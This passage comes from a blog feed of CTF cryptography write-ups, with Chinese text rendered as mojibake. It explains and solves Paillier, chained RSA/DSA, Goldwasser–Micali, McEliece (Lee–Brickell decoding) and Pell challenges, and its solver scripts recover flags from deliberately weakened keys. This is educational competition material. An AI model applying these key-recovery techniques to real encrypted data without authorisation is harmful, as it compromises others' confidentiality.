        <content type="html"><![CDATA[<h3 id="not-RSA"><a href="#not-RSA" class="headerlink" title="not_RSA"></a>not_RSA</h3><h4 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>Paillier cryptosystem</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="2004225e9ff0cc3c4c4.py">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>ä»$Z_{n}\times Z_{n}^{<em>}$åˆ°$Z_{n^{2}}^{</em>}$å­˜åœ¨åŒå°„å…³ç³»$(x,y)\rightarrow g^{x}y^{n}(mod\ n^{2})$</p><p>Paillier cryptosystemç³»ç»ŸåŠ è§£å¯†æµç¨‹å¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/Snipaste_2020-04-25_23-32-48.png" alt></p><p>which $\lambda =lcm(p-1,q-1),L(u)=\frac{u-1}{n}$</p><p><strong>Proofï¼š</strong> </p><p>$g\in Z_{n^{2}}^{*},\quad\therefore \exists(a, b),s.t.\ g=(n+1)^{a}b^{n}(mod\ n^{2})$</p><p>$c^{\lambda}=(n+1)^{am\lambda}b^{nm\lambda}r^{n\lambda}=(n+1)^{am\lambda}=1+am\lambda n(mod\ n^{2})$</p><p>$L(c^{\lambda}\ mod\ n^{2})=am\lambda$ï¼ŒåŒç†$L(g^{\lambda}\ mod\ n^{2})=a\lambda$ï¼Œè¯æ¯•</p><p>æœ¬é¢˜$g=n+1$ï¼Œä¸”nå¯ä»¥ç›´æ¥Fermatåˆ†è§£å¾—åˆ°pqï¼ŒæŒ‰ä¸Šè¿°æ–¹æ³•è§£å¯†å³å¯</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line">lcm = ((p - <span class="number">1</span>) * (q - <span class="number">1</span>)) // GCD(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">a = (pow(c, lcm, n * n) - <span class="number">1</span>) // n</span><br><span class="line">b = (pow(n + <span class="number">1</span>, lcm, n * n) - <span class="number">1</span>) // n</span><br><span class="line">m = long_to_bytes((a * inverse(b, n)) % n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>å•ä»è¿™é“é¢˜æœ¬èº«æ¥çœ‹ï¼Œå…¶å®ä¸äº†è§£è¿™ä¸ªå¯†ç ç³»ç»Ÿä¹Ÿå¯ï¼Œå› ä¸º$g=n+1$ï¼Œä¸”$r^{n\cdot lcm(p-1)(q-1)}\equiv 1(mod\ n^{2})$ï¼Œæ‰€ä»¥$c^{lcm}\rightarrow$  äºŒé¡¹å¼å®šç†å³å¯å¾—$m\cdot lcm(mod\ n)$</p><h3 id="Complex-Encode"><a href="#Complex-Encode" class="headerlink" title="Complex Encode"></a>Complex Encode</h3><h4 id="é¢˜ç›®è€ƒç‚¹-1"><a href="#é¢˜ç›®è€ƒç‚¹-1" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>æœ‰é™åŸŸå¼€æ ¹</li><li>å…¶ä»–RSA/DSAåŸºç¡€çŸ¥è¯†</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-1"><a href="#é¢˜ç›®æ–‡ä»¶-1" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="2004225e9ff0cc9e73b.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>å¥—å¨ƒé¢˜- -æµç¨‹æ‹é¡ºä¹Ÿå°±å‡ºæ¥äº†</p><p>Step 1ï¼šRSAåŠ å¯†ï¼Œä¸”$GCD(phi_{1},e_{1})=random.randint(3, 12)$ï¼Œ$p_{1}$ä½œä¸ºæ³„éœ²ä¿¡æ¯è¿›å…¥Step2</p><p>Step 2ï¼š$p_{1}$ä½œä¸ºDSA Signatureçš„ç§é’¥ï¼Œå¯¹rsaEncode2(false_flag)ç­¾åï¼Œå¹¶è¿”å›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sig = r.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>) + s.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>) + k.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>)+ q.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>)</span><br><span class="line">f.write(<span class="string">"dsaEncode :"</span>+base64.b64encode(sig).decode()+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>Step 3ï¼šStep 2ä¸­çš„rsaEncode2(false_flag)æ¥è‡ªäºç¬¬äºŒä¸ªRSAåŠ å¯†ç³»ç»Ÿçš„è¿”å›å€¼ï¼Œå¯ä»¥çœ‹åˆ°gen_primeæ—¶ç”¨äº†next_primeï¼Œè´¹é©¬åˆ†è§£å¾—åˆ°$p_{2},q_{2}$ï¼Œä¸”å‘ç°$GCD(e_{2},phi_{2})=41$ï¼Œå› æ­¤å…ˆå¾—åˆ°äº†$m_{2}^{41}(mod\ n_{2})$ï¼Œ$F_{p_{2}},F_{q_{2}}$ä¸Šå¯¹$c_{2}$å¼€41æ¬¡æ ¹ï¼Œå¹¶å¯¹æ‰€æœ‰ç»„åˆcrtå³å¯è¿˜åŸ$m_{2}$ï¼ˆ<code>b&#39;flag{T0o_YoUn9_to0_4imP1e}&#39;</code>ï¼‰ï¼Œä½†æ— æ„ä¹‰ï¼Œè¯¥rsaç³»ç»Ÿè¿”å›å€¼ä¸º$m_{2}^{41}(mod\ n_{2})$ï¼Œfine</p><p>Step 2ä¸­(r, s, k, q, m)å‡å·²çŸ¥ï¼Œå¯ç›´æ¥æ±‚å‡ºç§é’¥xï¼Œä¹Ÿå³ä¸º$p_{1}$</p><p>å†å¯¹ç¬¬ä¸€ä¸ªRSAç³»ç»Ÿå¸¸è§„è§£å¯†å¾—åˆ°$m_{1}^{5}$ï¼Œæœ€åæœ‰é™åŸŸå¼€æ ¹crtæ‹¿åˆ°flag</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¬¬äºŒä¸ªRSAè§£å¯†ç•¥</span></span><br><span class="line">m2 = bytes_to_long(<span class="string">b'flag&#123;T0o_YoUn9_to0_4imP1e&#125;'</span>)</span><br><span class="line">ran2 = <span class="number">41</span></span><br><span class="line">rsaEnc2 = pow(m2, ran2, n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">sig = <span class="string">b'...'</span></span><br><span class="line">sig = b64decode(sig)</span><br><span class="line">r = bytes_to_long(sig[:<span class="number">205</span>])</span><br><span class="line">s = bytes_to_long(sig[<span class="number">205</span>:<span class="number">410</span>])</span><br><span class="line">k = bytes_to_long(sig[<span class="number">410</span>:<span class="number">615</span>])</span><br><span class="line">q = bytes_to_long(sig[<span class="number">615</span>:<span class="number">820</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">Hm = int.from_bytes(hashlib.md5(str(rsaEnc2).encode(<span class="string">'utf-8'</span>)).hexdigest().encode(), <span class="string">'big'</span>)</span><br><span class="line">x = ((s * k - Hm) % q) * inverse(r, q)</span><br><span class="line">n1 = ...</span><br><span class="line">p1 = x % q</span><br><span class="line">q1 = n1 // p1</span><br><span class="line">e1 = <span class="number">0x12a316381</span></span><br><span class="line">c1 = ...</span><br><span class="line"><span class="keyword">assert</span>(GCD(e1, (p1 - <span class="number">1</span>)*(q1 - <span class="number">1</span>)) == <span class="number">5</span>)</span><br><span class="line">d1 = inverse(e1 // <span class="number">5</span>, (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>))</span><br><span class="line">m1_5 = pow(c1, d1, n1)</span><br><span class="line"></span><br><span class="line">PP.&lt;x&gt; = PolynomialRing(Zmod(p1))</span><br><span class="line">fp = x^<span class="number">5</span> - (m1_5 % p1)</span><br><span class="line">m1_p = fp.roots()</span><br><span class="line">PQ.&lt;y&gt; = PolynomialRing(Zmod(q1))</span><br><span class="line">fq = y^<span class="number">5</span> - (m1_5 % q1)</span><br><span class="line">m1_q = fq.roots()</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m1_p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m1_q:</span><br><span class="line">        tmp.append((i[<span class="number">0</span>], j[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (m1p, m1q) <span class="keyword">in</span> tmp:</span><br><span class="line">    print(long_to_bytes(crt([int(m1p), int(m1q)], [int(p1), int(q1)])))</span><br><span class="line"><span class="comment"># b'flag&#123;2a4d55342b46289d1f624d3083c5e2de&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(HFCTF) - Crypto</title>
      <link href="/2020/04/21/WriteUp-HFCTF-Crypto/"/>
      <url>/2020/04/21/WriteUp-HFCTF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="GM"><a href="#GM" class="headerlink" title="GM"></a>GM</h3><h4 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>Goldwasserâ€“Micali (GM) cryptosystem (Legendreç¬¦å·)</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="GM.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>GMå¯†é’¥ç”Ÿæˆï¼š</p><p>ç”Ÿæˆå¤§ç´ æ•°p,qï¼ŒN=pqï¼Œå†é€šè¿‡éšæœºé€‰æ‹©æ‰¾åˆ°xï¼Œä½¿å¾—xæ˜¯æ¨¡på’Œæ¨¡qçš„äºŒæ¬¡éå‰©ä½™ï¼Œåˆ™ç”±Legendreå®šä¹‰çŸ¥$(\frac{x}{p})=(\frac{x}{q})=-1$</p><p>å…¬é’¥(x, N)ï¼Œç§é’¥(p, q)</p><p>GMåŠ å¯†ï¼š</p><p>æ˜æ–‡äºŒè¿›åˆ¶è¡¨ç¤ºä¸º$(m_{1},m_{2},â€¦,m_{n})$</p><p>å¯¹æ¯ä¸ª$m_{i}$ï¼Œç”Ÿæˆéšæœºå€¼$y_{i}$ï¼Œ$c_{i}=y_{i}^{2}x^{y_{i}|m_{i}}\ mod\ N$</p><p>GMè§£å¯†ï¼š</p><p>å¯†æ–‡äºŒè¿›åˆ¶è¡¨ç¤ºä¸º$(c_{1},x_{2},â€¦,c_{n})$</p><p>å¯¹æ¯ä¸ª$c_{i}$ï¼ŒéªŒè¯$(\frac{c_{i}}{p})$å’Œ$(\frac{c_{i}}{q})$ï¼Œåˆ™ç”±xä¸ºäºŒæ¬¡éå‰©ä½™æ˜“å¾—ï¼Œå‹’è®©å¾·ç¬¦å·å‡ä¸º1æ—¶$m_{i}=0$ï¼Œå‡ä¸º-1æ—¶$m_{i}=1$</p><p>é¢˜ç›®ä¸­æ³„éœ²äº†$\varphi(N)$ï¼Œå› æ­¤ç›¸å½“äºæš´éœ²ç§é’¥ï¼Œç›´æ¥è§£å¯†å³å¯</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">phi = ...</span><br><span class="line">n = ...</span><br><span class="line">sum = n + <span class="number">1</span> - phi</span><br><span class="line">delta = (sum**<span class="number">2</span>) - <span class="number">4</span> * n</span><br><span class="line">sqrt_delta = int(iroot(delta, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = (sum + sqrt_delta) // <span class="number">2</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">if</span> pow(i, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> pow(i, (q - <span class="number">1</span>) // <span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">'1'</span></span><br><span class="line">print(long_to_bytes(int(flag, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure><h3 id="mceliece"><a href="#mceliece" class="headerlink" title="mceliece"></a>mceliece</h3><p>æ¯”èµ›æœŸé—´æ‰¾åˆ°çš„paperæœ‰ç‚¹æ‚ï¼Œå†åŠ ä¸ŠGoppaç çœ‹å¾—äº‘é‡Œé›¾é‡Œï¼Œäºæ˜¯ç»“æŸå‰ä¸‰å››ä¸ªå°æ—¶å°±å»æ‘¸é±¼äº†- -èµ›åå¡«äº†ä¸‹å‘ï¼Œåœ¨æ­¤åšä¸‹è®°å½•</p><h4 id="é¢˜ç›®è€ƒç‚¹-1"><a href="#é¢˜ç›®è€ƒç‚¹-1" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>Information-set decoding</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-1"><a href="#é¢˜ç›®æ–‡ä»¶-1" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="mceliece.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Goppaç </strong>ï¼š(å…·ä½“çº é”™åŸç†è¿™é‡Œä¸è´¹ç¯‡å¹…å†™ï¼Œå› ä¸ºå’Œæœ¬é¢˜æ¶‰åŠæ”»å‡»æ–¹æ³•åŸºæœ¬æ— å…³è”)</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_16-02-18.png" alt></p><p>å¯ä»¥ç”¨[n, k, d]çº¿æ€§ç æ¥æè¿°Goppaç ï¼Œæ»¡è¶³ç»´åº¦$k\geq n-mt$ï¼Œæœ€å°æ±‰æ˜é‡é‡$d\geq t+1$</p><p>å…¶å¯¹åº”generator matrixä¸º$k\times n$ï¼Œä¸”rank(G)=kï¼Œæ»¡è¶³$GH^{T}=0(H^{T}ä¸ºæ ¡éªŒçŸ©é˜µ)$</p><p>æœ€å¤šèƒ½çº æ­£tä¸ªé”™è¯¯</p><p><strong>The McEliece cryptosystem</strong>ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_18-04-33.png" alt></p><p>$Gâ€™=SGP$ï¼ˆSæ˜¯éšæœºç”Ÿæˆçš„$k\times k$å¯é€†çŸ©é˜µï¼ŒGæ˜¯Goppaç çš„$k\times n$ç”ŸæˆçŸ©é˜µï¼ŒPæ˜¯éšæœºçš„$n\times n$æ’åˆ—çŸ©é˜µ(å³æ¯è¡Œ/æ¯åˆ—ä¸Šä»…æœ‰ä¸€ä¸ª1ï¼Œå…¶ä»–å‡ä¸º0)ï¼‰</p><p>å…¬é’¥ä¸º$(Gâ€™,k,n)$ï¼Œç§é’¥ä¸º$(S,G,P)$åŠGoppaç çš„gç­‰</p><p>$GF(2)$ä¸Šçš„McElieceäºŒè¿›åˆ¶åˆ†ç»„é•¿åº¦ä¸ºkï¼ŒåŠ å¯†æ—¶$c=mGâ€™,y=c+e$ï¼Œyä½œä¸ºå¯†æ–‡å‘é€</p><p>æ”»å‡»è€…ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§æ”»å‡»é€”å¾„ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_18-07-49.png" alt></p><p>è¿™é‡Œä¸ä»‹ç»ç¬¬ä¸€ç§ç»“æ„æ”»å‡»ï¼Œé‡ç‚¹åœ¨ç¬¬äºŒç§å€ŸåŠ©Information Setçš„æ”»å‡»æ–¹æ³•</p><p>è®¾Iä¸º$\{1,â€¦,n\}$çš„ä¸€kå…ƒå­é›†ï¼Œåˆ™$G_{I}$å®šä¹‰ä¸ºï¼šä»¥Iä½œåˆ—ç´¢å¼•ï¼Œä»Gâ€™ä¸­å¾—åˆ°çš„$k\times k$å­çŸ©é˜µï¼Œå¦‚æœ$G_{I}$å¯é€†ï¼Œåˆ™Iæ»¡è¶³Information Setå®šä¹‰</p><p>Information-set decodingä¸€èˆ¬å½¢å¼ä¸‹ï¼Œè¦æ±‚è¾“å…¥</p><ul><li>$F_{q}^{n}$ä¸‹çš„å‘é‡y(å³McElieceç³»ç»Ÿçš„å¯†æ–‡ï¼Œä¸cçš„æ±‰æ˜è·ç¦»ä¸ºw)</li><li>$k\times n$çŸ©é˜µGâ€™</li></ul><p>åˆ™ä»¤Iä¸ºInformation Setï¼Œä»¥å…¶ä½œä¸ºåˆ—ç´¢å¼•å¾—åˆ°$y_{I},G_{I}$ï¼Œè®¡ç®—$y_{I}G_{I}^{-1}Gâ€™(1\times n)$ï¼Œå³è®¤ä¸ºå…¶ç­‰äºcæˆ–æ˜¯cçš„ä¸€ä¸ªè¿‘ä¼¼ä¼°è®¡</p><p><strong>[Leeâ€“Brickellâ€™s algorithm]</strong></p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_20-03-07.png" alt></p><p>$g_{a}$è¡¨ç¤º$G_{I}^{-1}Gâ€™$ä¸­aç´¢å¼•çš„åˆ—ä¸Šå”¯ä¸€çš„1æ‰€åœ¨çš„è¡Œå‘é‡ï¼ˆç”±å®šä¹‰æ˜“çŸ¥è¯¥åˆ—ä¸Šä»…æœ‰1ä¸ª1ï¼Œå…¶ä»–å‡ä¸ºé›¶å…ƒï¼‰</p><p>Step 1ä¸­Information-setä½œåˆ—ç´¢å¼•å¯¹åº”çš„$y_{I}$ï¼Œå¦‚æœkä¸ªå…ƒç´ å‡æ— è¯¯å·®ï¼Œåˆ™$y_{I}G_{I}^{-1}Gâ€™$èƒ½ç›´æ¥æ¢å¤å‡ºcï¼ˆè¿™ä¸€ç‚¹å¾ˆå¥½è¯æ˜ï¼‰ï¼Œä½†kä¸ªå…ƒç´ ä¸­å­˜åœ¨è¯¯å·®å…ƒæ—¶ï¼Œè¦è¿›è¡ŒStep 3çš„æ±‰æ˜å˜æ¢ï¼ˆ$p_{max}=w$ï¼Œä½†ä¸€èˆ¬pä¸å–$p_{max}$ï¼Œå°½ç®¡å–$p_{max}$èƒ½ä¿è¯ä»»æ„Information-setéƒ½èƒ½åœ¨Step 3å¾—åˆ°æ­£ç¡®çš„eï¼Œä½†pè¿‡å¤§ä¼šä½¿å¾—Step 3ä¸­çš„(A, m)ç»„åˆè¿‡å¤šï¼Œé€‚å®œå³å¯ï¼‰</p><p>ä¸‹å›¾ä¸º$p=p_{max}=w$æ—¶çš„è¿è¡Œæˆªå›¾</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_22-38-03.png" alt></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = load(<span class="string">"cipher.sobj"</span>)</span><br><span class="line">pubkey = load(<span class="string">"pubkey.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lee_Brickell</span><span class="params">(y, G, Fq, w, p_max)</span>:</span></span><br><span class="line">    n, k = G.ncols(), G.nrows()</span><br><span class="line">    <span class="comment">#cnt = 0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># step 1</span></span><br><span class="line">        I = sample(range(n), k) <span class="comment"># Information Set</span></span><br><span class="line">        G_I = G.matrix_from_columns(I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> G_I.is_invertible():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        invG_I = G_I.inverse()</span><br><span class="line">        y_I = y.matrix_from_columns(I)</span><br><span class="line">        <span class="comment"># step 2</span></span><br><span class="line">        e_base = y - y_I * invG_I * G <span class="comment"># e which may be inaccurate</span></span><br><span class="line">        <span class="comment"># step 3</span></span><br><span class="line">        g = (invG_I * G).rows()</span><br><span class="line">        <span class="comment">#cnt += 1</span></span><br><span class="line">        <span class="comment">#print(cnt)</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(p_max + <span class="number">1</span>): <span class="comment"># size-p subset</span></span><br><span class="line">            <span class="keyword">for</span> A <span class="keyword">in</span> itertools.combinations(range(k), p):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> itertools.product(Fq.list()[<span class="number">1</span>:], repeat=p):</span><br><span class="line">                    e = e_base[<span class="number">0</span>] - sum(m[i] * g[A[i]] <span class="keyword">for</span> i <span class="keyword">in</span> range(p))</span><br><span class="line">                    <span class="keyword">if</span> e.hamming_weight() == w:</span><br><span class="line">                        <span class="keyword">return</span> e</span><br><span class="line">                    </span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> cipher:</span><br><span class="line">    e = Lee_Brickell(y, pubkey, F2, <span class="number">6</span>, <span class="number">2</span>)</span><br><span class="line">    c = y - Matrix(e) <span class="comment"># m * pubkey == c</span></span><br><span class="line">    m = pubkey.solve_left(c)</span><br><span class="line">    flag += <span class="string">""</span>.join([str(i) <span class="keyword">for</span> i <span class="keyword">in</span> m[<span class="number">0</span>]])</span><br><span class="line">flag += <span class="string">"0"</span> * (<span class="number">8</span> - len(flag) % <span class="number">8</span>)</span><br><span class="line">long_to_bytes(int(flag, <span class="number">2</span>))</span><br><span class="line"><span class="comment"># b'flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;\x00\x00\x00\x00'</span></span><br></pre></td></tr></table></figure><h4 id="Ref"><a href="#Ref" class="headerlink" title="[Ref]"></a>[Ref]</h4><p><a href="information-set-decoding.pdf">information-set-decoding.pdf</a></p><p><a href="Goppa Codes and Their Use in the McEliece Cryptosystems.pdf">Goppa Codes and Their Use in the McEliece Cryptosystems.pdf</a></p><h3 id="pell"><a href="#pell" class="headerlink" title="pell"></a>pell</h3><h4 id="é¢˜ç›®è€ƒç‚¹-2"><a href="#é¢˜ç›®è€ƒç‚¹-2" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>pellæ–¹ç¨‹é€’æ¨å¼</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-2"><a href="#é¢˜ç›®æ–‡ä»¶-2" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="pell.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>åªè€ƒä¸ªpellæ–¹ç¨‹é€’æ¨å¼è€Œå·²â€¦</p><p><a href="https://blog.csdn.net/Herishwater/article/details/95640981?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4" target="_blank" rel="noopener">https://blog.csdn.net/Herishwater/article/details/95640981?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4</a></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><p>æœªè®°å½•</p><p>è®°å¾—äº¤äº’æ—¶åŠ sleepï¼Œé¶æœºç”¨çš„socketï¼Œç›´æ¥å‘æˆ–è€…å»¶æ—¶å¤ªé•¿å‘éƒ½ä¼šå‡ºé”™</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>cry2çœ‹paperçš„æ—¶å€™æ²¡æŠ“åˆ°é‡ç‚¹â€¦å¦‚æœæ¯”èµ›åæœŸä¸å»æ‘¸é±¼çš„è¯æŒ‡ä¸å®šè¿˜èƒ½æ‹¿ä¸‹è¿™é¢˜ï¼Œwtcl</p><p>æœ€åé«˜æ ¡ç»„rank27ï¼Œå‰20è¿›çº¿ä¸‹ï¼ˆè‡ªé—­</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Information Set </tag>
            
        </tags>
      
    </entry>
    
    
    
